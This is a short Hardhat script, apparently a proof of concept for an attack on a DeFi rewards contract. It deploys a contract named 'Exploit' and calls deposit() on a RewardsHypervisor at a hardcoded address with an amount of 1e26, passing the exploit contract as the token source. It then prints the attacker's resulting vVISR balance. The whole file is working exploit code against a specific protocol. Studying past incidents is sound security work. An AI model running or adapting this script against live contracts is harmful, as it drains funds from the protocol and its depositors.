const hre = require("hardhat");

async function main() {
    const Attacker = await hre.ethers.getSigner();
    const Exploit = await hre.ethers.getContractFactory("Exploit");
    const exploit = await Exploit.deploy();
    await exploit.deployed();

    console.log("Exploit contract deployed to:", exploit.address);

    const RewardsHypervisor = await hre.ethers.getContractAt('IRewardsHypervisor', "0xc9f27a50f82571c1c8423a42970613b8dbda14ef")
    const depositTx = await RewardsHypervisor.deposit("100000000000000000000000000",exploit.address,Attacker.getAddress());
    console.log("Exploiting... transcation:", depositTx.hash);
    await depositTx.wait();
    console.log("exploit complete");

    const vVISR = await hre.ethers.getContractAt("IvVISR","0x3a84ad5d16adbe566baa6b3dafe39db3d5e261e5");
    const balance = (await vVISR.balanceOf(Attacker.address))/(10**(await vVISR.decimals()))
    console.log("Attacker vVISR balance:"+balance);



}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
